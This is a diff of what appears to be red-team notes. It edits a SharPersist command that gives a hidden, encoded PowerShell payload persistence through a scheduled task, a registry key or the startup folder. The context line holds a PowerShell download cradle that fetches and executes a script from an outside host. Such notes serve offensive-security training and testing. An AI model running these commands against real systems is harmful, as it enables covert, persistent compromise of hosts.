@@ -43,5 +43,5 @@ $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a
 ```
 Configuration of the Host Persistence
 ```
-execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t [schtask | reg | startupfolder] -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc PAYLOAD_ENCODEADO" -n "Nombre_de_la_tarea" -m add -o [hourly | daily | logon]
+execute-assembly SharPersist.exe -t [schtask | reg | startupfolder] -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc PAYLOAD_ENCODEADO" -n "TASK_NAME" -m add -o [hourly | daily | logon] [-f "filename"] [-k "REGISTRY_KEY_TO_MODIFIE" -v "REGISTRY_KEY_TO_CREATE"]
 ```
